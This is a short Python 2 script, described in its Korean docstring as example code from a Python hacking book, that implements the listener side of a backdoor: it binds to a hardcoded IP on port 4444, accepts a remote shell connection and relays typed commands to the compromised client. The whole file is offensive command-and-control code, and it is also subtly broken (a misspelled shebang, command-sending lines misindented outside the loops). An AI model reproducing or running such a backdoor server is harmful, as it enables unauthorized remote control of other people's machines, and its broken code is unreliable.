#!/usr/bin/env pytohn
#-*- coding: utf-8 -*-
'''
    python ==> 파이썬해킹프로그래밍, 백도어 서버를 작성한 예제 코드
'''
import socket
import sys

host = '203.246.114.111'
port = 4444
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((host,port))
server.listen(5)

print "[*] Server bound to %s: %d" % (host,port)

connected = False

while 1:
    if not connected:
        (client,address) = server.accept()

        connected = True

    print "[*] Accepted Shell Connection"
    buffer = ""

    while 1:
        try:
            recv_buffer = client.recv(4096)
            print "[*] Received: %s" % recv_buffer
            if not len(recv_buffer):
                break
            else:
                buffer += recv_buffer
        except:
            break


command = raw_input("Enter Command> ")
client.sendall(command + "\r\n\r\n")
print "[*] Sent = > %s" %command


    
